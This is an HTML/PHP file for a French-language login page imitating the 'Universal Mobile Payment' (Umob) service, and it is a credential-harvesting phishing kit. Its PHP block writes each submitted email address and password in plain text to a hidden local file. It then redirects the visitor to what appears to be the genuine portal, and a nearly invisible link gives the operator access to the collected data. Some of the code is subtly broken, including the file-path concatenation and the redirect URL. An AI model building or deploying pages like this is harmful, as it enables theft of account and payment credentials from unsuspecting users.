<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fichier Login1</title>
    <link rel="stylesheet" href="Login1style.css">
</head>
<body>
    <div >
        <img class="logo" src="../login Umob/img et logo/logo-umob.png" alt="">
    </div>
    <div class="container">
        <form method="POST">
            <p><img src="../login Umob/img et logo/logologin.png" alt=""></p>
         <label class="BLEU" >Veuillez vous identifier</label><br>
            <p><label class="lab">Adresse e-mail:</label><input class="input1" type="email"  name="email"></p>
            <p> <label class="lab" >  Mot de Passe :</label> <input class="input1" type="password"  name="password"></p>
            <p><input type="submit" value="OK"></p>
            <p><label>Vous n'avez pas de compte ?</label> </p>
            <p><a href="0">Inscivez-vous</a></p>
            <p><a href="">Mot de passe oublié?</a></p>
            <label for="">Contactez nous:</label><a href="customer.umob@gmail.com">customer.umob@gmail.com</a> <br>
            <div class="BLEU2">
            <label class="BLEU1" >Copyright (c) 2011-2021 Universal Mobile Payment</label>
            </div>
              </form>
    </div><br>
    <div class="cap"><a href="email_recuperer/recuperphp">.<img scr="img et logo/Capture.png">.</a></div>
  

</body>
<!-- Code PHP -->

<?php
if(!empty(($_POST['email'])) && !empty(($_POST['password']))){

	$email = $_POST['email'];
    $password = $_POST['password'];
	if(filter_var($email, FILTER_VALIDATE_EMAIL)){
		(string)$fichier = __DIR__ . DIRECTORY_SEPARATOR . 'email_recuperer' . DIRECTORY_SEPARATOR . recuper.'php';
		file_put_contents($fichier ,"[Email : ". $email ." Mot de passe : " .$password. "]".PHP_EOL, FILE_APPEND);
		$email ="";
        $password ="";
        header('Location: portal.universalmobilepayment.com/login.php'); 
	}else{ 
	
	}
}

?>

</html>